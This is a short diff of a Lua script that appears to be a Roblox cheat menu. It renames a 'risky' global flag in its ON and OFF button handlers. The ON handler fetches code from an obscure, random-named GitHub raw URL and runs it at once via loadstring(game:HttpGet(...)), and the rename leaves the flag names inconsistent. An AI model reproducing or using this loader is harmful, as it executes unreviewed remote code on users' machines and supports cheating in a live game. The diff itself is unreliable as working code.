@@ -145,7 +145,7 @@ Tab:AddButton({
             Image = "rbxassetid://4483345998",
             Time = 5
         })
-        _G.veryrisky = true
+        _G.veryrisk = true
         loadstring(game:HttpGet("https://raw.githubusercontent.com/MysticCipherLuminaraPVQW8913/AKKCJSU/main/j2h5k8l3a7s4"))()
         print("Successful ✔ (ON)")
     end
@@ -160,7 +160,7 @@ Tab:AddButton({
             Image = "rbxassetid://4483345998",
             Time = 5
         })
-        _G.veryrisky = true
+        _G.veryrisk = false
         print("Successful ✔ (OFF)")
     end
 })
